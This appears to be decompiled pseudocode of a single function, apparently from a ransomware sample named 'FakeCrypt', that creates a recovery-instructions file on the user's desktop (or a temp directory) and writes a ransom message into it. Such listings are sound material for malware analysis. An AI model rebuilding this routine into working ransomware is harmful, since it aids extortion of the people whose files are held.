__int64 FakeCrypt::fileops::drop_ransom_note()
{
  char v0; // bp
  __int64 v1; // rax
  __int64 result; // rax
  unsigned int v3; // [rsp+4h] [rbp-64h] BYREF
  __int128 v4; // [rsp+8h] [rbp-60h] BYREF
  __int64 v5; // [rsp+18h] [rbp-50h]
  __int128 v6; // [rsp+20h] [rbp-48h] BYREF
  __int64 v7; // [rsp+30h] [rbp-38h]
  _BYTE v8[40]; // [rsp+40h] [rbp-28h] BYREF

  dirs::desktop_dir(&v4);
  if ( __OFSUB__(0LL, (_QWORD)v4) )
  {
    std::path::Path::to_path_buf(&v6, aTmp, 4LL);
  }
  else
  {
    v7 = v5;
    v6 = v4;
  }
  std::path::Path::join(v8, *((_QWORD *)&v6 + 1), v7, aReadmeRecoverF, 24LL);
  std::fs::File::create(&v4, v8);
  v0 = v4;
  if ( (_DWORD)v4 != 1 )
  {
    v3 = DWORD1(v4);
    v1 = std::io::Write::write_all(&v3, aYourFilesHaveB, 138LL);
    core::ptr::drop_in_place<core::result::Result<(),std::io::error::Error>>(v1);
    core::ptr::drop_in_place<std::fs::File>(v3);
  }
  result = core::ptr::drop_in_place<std::path::PathBuf>(&v6);
  if ( v0 )
    return core::ptr::drop_in_place<core::result::Result<std::fs::File,std::io::error::Error>>(&v4);
  return result;
}